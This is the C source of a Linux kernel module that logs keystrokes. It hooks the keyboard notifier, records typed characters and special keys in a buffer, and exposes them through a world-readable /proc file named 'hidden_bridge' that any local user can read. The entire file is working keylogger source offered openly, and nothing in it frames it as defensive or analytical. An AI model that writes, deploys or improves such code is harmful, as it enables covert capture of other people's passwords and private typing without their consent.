#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/keyboard.h>
#include <linux/input-event-codes.h>

#define PROC_NAME "hidden_bridge"
#define STATUS_BUF_SIZE 128
#define LOG_BUF_SIZE 1024

static struct proc_dir_entry *proc_file;
static char key_buffer[LOG_BUF_SIZE]; // Buffer to store a sequence of keys
static int key_index = 0; // Tracks how many keys were stored so far

static ssize_t keylogger_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) // callback function
{
    int len = key_index; // Only the bytes that were filled

    if (*ppos > 0)
    {
        return 0;
    }

    if (len == 0)
    {
        return 0;
    }

    if (copy_to_user(buf, key_buffer, len)) // Move the raw keylogs to user space
    {
        return -EFAULT;
    }

    // After a read - clean buffer so we only send new keys next time
    memset(key_buffer, 0, sizeof(key_buffer));
    key_index = 0;

    *ppos = len;
    return len;
}

static const struct proc_ops keylogger_proc_ops =
{
    .proc_read = keylogger_read, // Tell the proc filesystem to use my read function when someone cat's the file (callback)
};

static void append_char(char c)
{
    if (key_index < LOG_BUF_SIZE - 1)
    {
        key_buffer[key_index] = c;
        key_index++;
    }
}

static void append_token(const char *token)
{
    int i;

    for (i = 0; token[i] != '\0'; i++)
    {
        if (key_index >= LOG_BUF_SIZE - 1)
        {
            break;
        }

        key_buffer[key_index] = token[i];
        key_index++;
    }
}

static void log_unicode_char(unsigned int ch)
{
    char c = (char)ch;

    // ASCII space to ~
    if ((c >= 0x20 && c <= 0x7E))
    {
        append_char(c);
    }
}

// Handle special/action keys based on KEY_* keycodes (pre kernel translation)
static void log_special_key(unsigned int keycode)
{
    switch (keycode)
    {
        case KEY_BACKSPACE:
            append_token("[BS]");
            break;

        case KEY_ENTER:
            append_char('\n');
            break;

        case KEY_DELETE:
            append_token("[DEL]");
            break;

        case KEY_TAB:
            append_token("[TAB]");
            break;

        case KEY_ESC:
            append_token("[ESC]");
            break;

        case KEY_LEFTSHIFT:
        case KEY_RIGHTSHIFT:
            append_token("[SHIFT]");
            break;

        case KEY_CAPSLOCK:
            append_token("[CAPS]");
            break;

        default:
            break;
    }
}

static void log_keysym(unsigned int sym)
{
    char c = (char)sym;

    if (c >= 0x20 && c <= 0x7E) 
    {
        append_char(c);
    }
}

static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param; // Cast the generic void pointer to the keyboard parameter struct

    if (!param->down)
    {
        return NOTIFY_OK;
    }

    // KBD_UNICODE for text, KBD_KEYCODE for special keys
    if (code == KBD_UNICODE) 
    {
        log_unicode_char(param->value); // text
    } 
    else if (code == KBD_KEYCODE)
    {
        log_special_key(param->value); // actions
    }
    else if (code == KBD_KEYSYM)
    {
        log_keysym(param->value); // actions with keysyms
    }

    return NOTIFY_OK; 
}

static struct notifier_block keylogger_nb =
{
    .notifier_call = keylogger_cb // Tell the keyboard subsystem to call my callback function when a key is pressed
};

static int __init keylogger_init(void)
{
    memset(key_buffer, 0, sizeof(key_buffer)); // Start with an empty log buffer

    register_keyboard_notifier(&keylogger_nb); // Tell Linux to start sending keyboard events to my callback
    proc_file = proc_create(PROC_NAME, 0444, NULL, &keylogger_proc_ops); // 0444 - read only permissions

    printk(KERN_INFO "keylogger: loaded\n"); 
    return 0;
}

static void __exit keylogger_exit(void)
{
    if (proc_file)
    {
        proc_remove(proc_file);
    }

    unregister_keyboard_notifier(&keylogger_nb); // Tell Linux to stop sending me keyboard events

    printk(KERN_INFO "keylogger: unloaded\n");
}

module_init(keylogger_init); // Tell the compiler which function is the startup hook
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");